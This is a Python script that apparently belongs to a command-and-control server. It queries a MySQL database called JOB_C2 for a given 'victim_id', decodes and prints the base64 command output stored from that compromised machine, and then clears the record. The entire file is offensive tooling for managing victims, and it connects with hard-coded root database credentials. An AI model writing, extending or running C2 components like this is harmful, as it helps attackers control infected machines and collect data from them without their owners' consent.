#!/usr/bin/env python
import io
import re
import base64
import sys
import json
import mysql.connector
from mysql.connector import MySQLConnection, Error

def getoutput( id ):

	#query to check whether or not the id requested appears in the database
	query = """ SELECT command_output FROM victim_machines WHERE victim_id =%s """
	data = (id,)

	#https://www.mysqltutorial.org/python-mysql-update/
	try:
		#connect to the mysql database
		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')
		if connection.is_connected():
			print('Connected to JOB_C2 database')

		cursor = connection.cursor(buffered=True)
		cursor.execute(query,data)
		result = cursor.fetchall()
#		print(result[0][0])

		if result:
			print("id found in the database, decoding output and cleaning database...")
			#get command output, decode it, output it, and set command_output to empty set
			output = result[0][0]
			output_bytes = output.encode('ascii')
			decoded_output_bytes = base64.b64decode(output_bytes)
			decoded_output = decoded_output_bytes.decode('ascii')

			json_data = json.loads(decoded_output)
			print(json.dumps(json_data, indent=2))

			cleanup_query = """ UPDATE victim_machines SET command_output = 'e30=' WHERE victim_id =%s """
			cursor.execute(cleanup_query,data)

		else:
			print("id not found in the database, try again")

		connection.commit()

	except Error as error:
		print(error)

	finally:
		cursor.close()
		connection.close()

	return True

if __name__ == "__main__":
	getoutput(*sys.argv[1:])
